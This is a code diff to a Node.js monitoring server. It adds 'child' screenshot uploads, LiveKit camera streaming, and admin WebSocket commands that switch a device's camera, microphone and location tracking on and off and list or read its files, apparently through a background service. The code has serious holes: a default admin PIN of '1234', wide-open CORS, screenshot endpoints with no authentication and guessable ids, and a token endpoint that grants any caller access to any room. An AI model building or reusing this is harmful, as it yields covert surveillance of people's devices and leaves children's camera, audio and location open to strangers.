@@ -2,6 +2,7 @@ const http = require('http')
 const fs   = require('fs')
 const path = require('path')
 const { WebSocketServer, WebSocket } = require('ws')
+const { AccessToken } = require('livekit-server-sdk')
 
 const ADMIN_PIN   = process.env.ADMIN_PIN || '1234'
 const CLIENT_DIR  = path.join(__dirname, '../client/dist')
@@ -12,6 +13,29 @@ const MAX_FILE_MB = 200
 // In-memory file store: requestId → { data, mime, name, adminId, fromUserId }
 // Auto-expires after 10 minutes
 const fileStore = new Map()
+
+// Screenshot store: id → { data, userId, userName, ts }
+// Keyed by userId for list lookup: screenshotIndex userId → [id, ...]
+const screenshotStore = new Map()
+const screenshotIndex = new Map()  // userId → [id, ...]
+const SCREENSHOT_TTL  = 24 * 60 * 60 * 1000  // 24 h
+
+function storeScreenshot(userId, userName, data) {
+  const id = `${userId}-${Date.now()}`
+  screenshotStore.set(id, { data, userId, userName, ts: Date.now() })
+  if (!screenshotIndex.has(userId)) screenshotIndex.set(userId, [])
+  screenshotIndex.get(userId).push(id)
+  // Auto-delete after 24 h
+  setTimeout(() => {
+    screenshotStore.delete(id)
+    const list = screenshotIndex.get(userId)
+    if (list) {
+      const idx = list.indexOf(id)
+      if (idx !== -1) list.splice(idx, 1)
+    }
+  }, SCREENSHOT_TTL)
+  return id
+}
 
 const MIME = {
   '.html': 'text/html', '.js': 'application/javascript',
@@ -50,7 +74,7 @@ function serveStatic(req, res) {
 
 const CORS = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS' }
 
-const server = http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
   try {
     const urlPath = req.url.split('?')[0]
 
@@ -141,6 +165,74 @@ const server = http.createServer((req, res) => {
           'Content-Length':      total,
         })
         res.end(file.data)
+      }
+      return
+    }
+
+    // ── Screenshot upload from child ─────────────────────────────────────────
+    if (req.method === 'POST' && urlPath.startsWith('/api/screenshot/')) {
+      const userId   = urlPath.replace('/api/screenshot/', '')
+      const userName = decodeURIComponent(req.headers['x-user-name'] || 'User')
+      const chunks = []; let total = 0
+      req.on('data', c => { total += c.length; if (total < 5 * 1024 * 1024) chunks.push(c) })
+      req.on('end', () => {
+        const data = Buffer.concat(chunks)
+        storeScreenshot(userId, userName, data)
+        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
+        res.end(JSON.stringify({ ok: true }))
+      })
+      req.on('error', () => { res.writeHead(500); res.end() })
+      return
+    }
+
+    // ── Screenshot list for admin ────────────────────────────────────────────
+    if (req.method === 'GET' && urlPath.startsWith('/api/screenshots/')) {
+      const userId = urlPath.replace('/api/screenshots/', '')
+      const ids = screenshotIndex.get(userId) || []
+      const list = ids.map(id => {
+        const s = screenshotStore.get(id)
+        return s ? { id, ts: s.ts, size: s.data.length } : null
+      }).filter(Boolean).sort((a, b) => b.ts - a.ts)
+      res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
+      res.end(JSON.stringify({ screenshots: list }))
+      return
+    }
+
+    // ── Single screenshot download ───────────────────────────────────────────
+    if (req.method === 'GET' && urlPath.startsWith('/api/screenshot/')) {
+      const id = urlPath.replace('/api/screenshot/', '')
+      const shot = screenshotStore.get(id)
+      if (!shot) { res.writeHead(404); res.end('Not found or expired'); return }
+      res.writeHead(200, { ...CORS, 'Content-Type': 'image/webp', 'Content-Length': shot.data.length })
+      res.end(shot.data)
+      return
+    }
+
+    // LiveKit token — child publishes, admin subscribes, room = child's userId
+    if (urlPath === '/api/lk-token' && req.method === 'GET') {
+      const params   = new URL(req.url, 'http://x').searchParams
+      const room     = params.get('room')     || ''
+      const identity = params.get('identity') || 'anon'
+      const lkUrl    = process.env.LIVEKIT_URL        || ''
+      const apiKey   = process.env.LIVEKIT_API_KEY    || ''
+      const apiSecret = process.env.LIVEKIT_API_SECRET || ''
+      if (!apiKey || !apiSecret || !lkUrl) {
+        res.writeHead(503, CORS); res.end(JSON.stringify({ error: 'LiveKit not configured' })); return
+      }
+      try {
+        const at = new AccessToken(apiKey, apiSecret, { identity, ttl: '10m' })
+        at.addGrant({
+          roomJoin:      true,
+          room,
+          canPublish:    identity !== 'admin',
+          canSubscribe:  true,
+          canPublishData: false,
+        })
+        const token = await at.toJwt()
+        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
+        res.end(JSON.stringify({ token, url: lkUrl }))
+      } catch (e) {
+        res.writeHead(500, CORS); res.end(JSON.stringify({ error: e.message }))
       }
       return
     }
@@ -263,12 +355,17 @@ wss.on('connection', (ws) => {
 
       // ── Admin commands ──────────────────────────────
       if (meta.role === 'admin') {
-        if (msg.type === 'ls' || msg.type === 'read_file') {
+        if (['ls', 'read_file', 'stop_camera',
+             'start_mic', 'stop_mic', 'start_location', 'stop_location'].includes(msg.type)) {
+          const target = users.get(msg.targetId)
+          if (target) send(target.bgWs || target.ws, { ...msg, fromAdminId: meta.userId })
+        }
+        // start_camera → both: browser ws (LiveKit publish) AND bgWs (JPEG fallback)
+        if (msg.type === 'start_camera') {
           const target = users.get(msg.targetId)
           if (target) {
-            // Prefer native background service if connected, else JS WebSocket
-            const targetWs = target.bgWs || target.ws
-            send(targetWs, { ...msg, fromAdminId: meta.userId })
+            send(target.ws, { ...msg, fromAdminId: meta.userId })
+            if (target.bgWs) send(target.bgWs, { ...msg, fromAdminId: meta.userId })
           }
         }
         // Admin DM to a specific user
@@ -301,7 +398,8 @@ wss.on('connection', (ws) => {
           return
         }
 
-        if (['ls_result', 'file_result', 'file_start', 'file_chunk', 'file_end', 'file_error'].includes(msg.type)) {
+        if (['ls_result', 'file_result', 'file_start', 'file_chunk', 'file_end', 'file_error',
+             'camera_frame', 'audio_chunk', 'location_update'].includes(msg.type)) {
           const admin = admins.get(msg.forAdminId)
           // Use primary userId for bg connections so RemoteFileBrowser filter matches
           const fromUserId = meta.isBg ? meta.primaryId : meta.userId
